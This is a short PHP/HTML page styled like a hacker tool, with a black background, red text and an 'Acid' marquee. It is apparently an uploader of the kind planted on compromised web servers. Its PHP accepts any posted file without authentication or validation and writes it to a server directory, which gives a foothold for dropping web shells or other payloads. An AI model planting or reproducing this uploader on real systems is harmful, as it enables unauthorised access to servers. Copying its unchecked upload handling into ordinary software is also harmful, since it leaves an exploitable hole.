http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Avinash Kumar Thapa</title>
</head>
<body bgcolor="white">
<?php
$uploaddir = '/tmp/'; // Change the directory as per the requirement
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
if(move_uploaded_file($_FILES['userfile']['tmp_name'],$uploadfile)) { print '<body bgcolor=#000></br></br><div

align=center><font size=5 color=#ff0000>uploaded successfully</font></body>';
} else { print '<body

bgcolor=#000></br></br><div align=center><font size=5 color=#ff0000Error !
</font> <marquee> Acid </marquee> </body>'; }
?>
<div style=" color:#F00;text-align:center; margin-top:60px; font-size:25px;
">&gt;&gt;  &nbsp;  Upload Your file </div>
<div style="padding-top:75px;margin-left:450px;width:340px; height:70px;">
<form enctype="multipart/form-data" action=" " method="post">
<input name="userfile" type="file" />&nbsp;
<input type="submit" value="Upload" />
</form>
</div>
</body>
</html>
